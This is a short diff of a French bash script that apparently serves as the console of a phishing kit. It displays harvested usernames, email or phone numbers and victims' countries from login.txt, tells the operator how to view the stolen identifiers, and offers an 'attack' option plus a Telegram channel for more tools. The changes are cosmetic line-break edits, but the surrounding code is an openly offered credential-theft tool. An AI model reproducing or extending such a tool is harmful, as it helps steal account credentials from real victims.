@@ -10,7 +10,7 @@ NC='\033[0m' # Pas de couleur
 
 # Fonction pour afficher les données de connexion
 afficher_donnees() {
-    echo -e "\n${CYAN}════ NOUVELLE CONNEXION DÉTECTÉE ════${NC}"
+    echo -e "\n${CYAN}CONNEXION DÉTECTÉE ═══${NC}"
     while IFS= read -r ligne; do
         if [[ "$ligne" == *"Username:"* ]]; then
             echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne#*: }"
@@ -24,7 +24,7 @@ afficher_donnees() {
             echo -e "${VERT}🌍 Pays: ${NC}${ligne#*: }"
         fi
     done < login.txt
-    echo -e "${CYAN}═🚨🚨 ouvrez une autre page et TAPEZ nano login.txt pour voir les identifiants 🚨${NC}\n"
+    echo -e "${CYAN}═🚨🚨 ouvrez une autre page\n et TAPEZ nano login.txt\n pour voir les identifiants 🚨${NC}\n"
 }
 
 # Fonction pour surveiller et afficher les données PHP en temps réel
@@ -155,7 +155,7 @@ echo -e "=========================================="
 echo -e "${NC}"
 
 echo -e "${JAUNE}1. Passer à l'attaque${NC}"
-echo -e "${JAUNE}2. Rejoindre notre canal Telegram pour plus d'outils${NC}"
+echo -e "${JAUNE}2. Rejoindre notre canal Telegram\n pour plus d'outils${NC}"
 
 # Lecture du choix utilisateur
 read -p "Choisissez une option (1 ou 2) : " choix
